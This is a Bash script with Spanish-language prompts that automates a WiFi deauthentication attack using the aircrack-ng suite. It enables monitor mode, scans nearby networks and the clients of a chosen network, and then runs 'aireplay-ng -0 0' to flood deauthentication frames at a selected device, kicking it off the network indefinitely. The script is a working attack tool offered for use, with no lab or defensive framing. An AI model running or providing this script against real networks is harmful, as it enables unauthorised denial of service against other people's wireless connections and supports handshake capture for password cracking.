greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function main(){
	clear
	echo -e "${greenColour}Mostrando interfaces de red..."
	sleep 1
	echo -e "${endColour}"
	ip a
	echo -e "${greenColour}"
	read -p "Interfaz a elegir: " interfaz
	export interfaz

	echo -e "${greenColour}Poniendo${redColour} ${interfaz} ${greenColour} en modo monidor..."
	sleep 1
	echo -e "${endColour}"
	airmon-ng start ${interfaz}
	echo ""
	echo -e "${redColour}${interfaz}${greenColour} puesta correctamente en modo monitor"
	read -p "Nombre de la interfaz en modo monitor: " moniinter
	sleep 1
	echo ""

	echo -e "${blueColour}Mostrando redes disponibles:"
	sleep 1
	echo "Recordar BSSID y el canal asignado a la red!"
	sleep 2
	airodump-ng ${moniinter}

	sleep 2

	echo -e "${blueColour}"
	read -p "BSSID de la red:" bssid
	read -p "Canal de la red:" channel

	echo -e "${greenColour}¡Escaneando dispositivos de ${redColour}${bssid}!"
	sleep 2
	airodump-ng -d ${bssid} -c ${channel} ${moniinter}

	echo -e "${redColour}"
	read -p "Dispositivo seleccionado para expulsar de la red: " device

	echo -e "${greenColour}Expulsando ${redColour} ${device} ${greenColour} de la red!"
	sleep 2
	echo -e "${endColour}"
	gnome-terminal -- aireplay-ng -0 0 -a ${bssid} -c ${device} ${moniinter}
	sleep 1
	echo -e "${greenColour}Cerrar terminal para finalizar :)"
	sleep 2
	read -p "Intro para parar el modo monitor de la antena"
	echo -e "${endColour}"
	airmon-ng stop ${moniinter}
}


main
